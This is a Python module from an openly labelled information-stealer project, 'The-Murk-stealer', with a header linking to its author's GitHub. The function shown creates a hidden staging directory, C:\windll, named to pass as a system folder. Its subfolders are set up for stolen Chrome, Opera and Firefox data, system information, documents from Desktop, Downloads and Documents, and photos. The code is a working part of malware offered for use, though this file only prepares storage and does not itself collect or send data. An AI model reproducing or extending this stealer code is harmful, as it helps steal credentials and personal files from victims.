#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import os

def makeFolders():
    if os.path.exists(r'C:\windll'):
        print('none')
    else:
        os.makedirs(r'C:\windll\Browsers')
        os.makedirs(r'C:\windll\Browsers\Chrome')
        os.makedirs(r'C:\windll\Browsers\Opera')
        os.makedirs(r'C:\windll\Browsers\Firefox')
        os.makedirs(r'C:\windll\System')
        os.makedirs(r'C:\windll\DocumentFiles\Desktop')
        os.makedirs(r'C:\windll\DocumentFiles\Downloads')
        os.makedirs(r'C:\windll\DocumentFiles\Documents')
        os.makedirs(r'C:\windll\Photos')

        '''
        os.makedirs(r'C:\windll\Chrome')
        os.makedirs(r'C:\windll\Opera')
        os.makedirs(r'C:\windll\Firefox')
        os.makedirs(r'C:\windll\SystemInformation')
        os.makedirs(r'C:\windll\Txt\Desktop')
        os.makedirs(r'C:\windll\Txt\Downloads')
        os.makedirs(r'C:\windll\Txt\Documents')
        '''